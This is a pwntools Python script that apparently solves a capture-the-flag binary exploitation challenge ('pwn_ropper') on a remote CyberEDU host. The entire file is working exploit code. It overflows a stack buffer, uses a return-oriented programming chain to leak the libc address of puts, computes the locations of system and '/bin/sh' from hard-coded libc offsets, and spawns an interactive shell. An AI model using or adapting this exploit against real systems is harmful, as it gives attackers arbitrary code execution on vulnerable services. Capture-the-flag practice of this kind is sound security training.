from pwn import *
elf = ELF('/home/kali/Downloads/pwn_ropper/pwn')
p=elf.process()

cyberedu = '35.246.200.178:30505'

context.arch = 'amd64'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    gdb.attach(p, gdbscript = 'b* 0x400677')

#local testing, run normally
#remote testing, run python3 exploit.py REMOTE

#padding
payload = b"A"*256
#rbp
payload += b"R" *8

main = p64(0x400679)
pop_rdi_ret = p64(0x400763)
ret = p64(0x4004c9)

puts_plt = p64(0x4004e0)

puts_got = p64(elf.got['puts'])

payload += pop_rdi_ret + puts_got +  puts_plt + main

p.recvuntil(b"?\n")
p.sendline(payload)

leak = p.recvline().strip()
addr = u64(leak.ljust(8, b"\x00"))
print(hex(addr))

#local
puts_offset = 0x585a0
system_offset = 0x2b110
binsh_offset = 0x17fea4

#2.23 amd64
puts_offset = 0x06f690
system_offset = 0x045390
binsh_offset = 0x18cd57

libc = addr - puts_offset
system = p64(libc + system_offset)
binsh = p64(libc + binsh_offset)

payload = b"A"*256
#rbp
payload += b"R" *8

payload += pop_rdi_ret + binsh + ret + system 
p.recvuntil(b"?\n")
p.sendline(payload)

p.interactive()
